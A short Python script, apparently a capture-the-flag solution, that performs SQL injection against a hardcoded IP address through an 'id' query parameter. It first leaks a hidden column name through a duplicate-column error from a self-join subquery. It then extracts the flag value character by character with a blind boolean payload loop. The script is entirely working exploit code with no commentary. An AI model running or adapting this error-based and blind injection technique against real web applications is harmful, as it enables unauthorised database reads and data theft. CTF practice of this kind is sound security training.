import requests
import re

url = "http://45.77.255.164/index.php"


# Get column
dump_column = "(select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id,t_fl4g_name_su)) as c)"
my_params = {
	'id': '1*' + dump_column
}
r = requests.get(url, params=my_params)
m = re.findall("Duplicate column name '(?P<col>.*)'", r.text)
flag_col = m[0]
print(flag_col)


# Blind 
flag = ""

for i in range(0, 100):
	for j in range(0,256):
		blind_payload = "(select ascii(right(left((select %s from flag_here_hihi limit 1),%s),1)) )-%s"%(flag_col, i,j)
		my_params = {
			'id': '1*' + blind_payload
		}
		
		r = requests.get(url, params=my_params)
		if r.text.find("handsome_flag") > 0:
			flag = flag + chr(j+1)
			break
	print(flag)
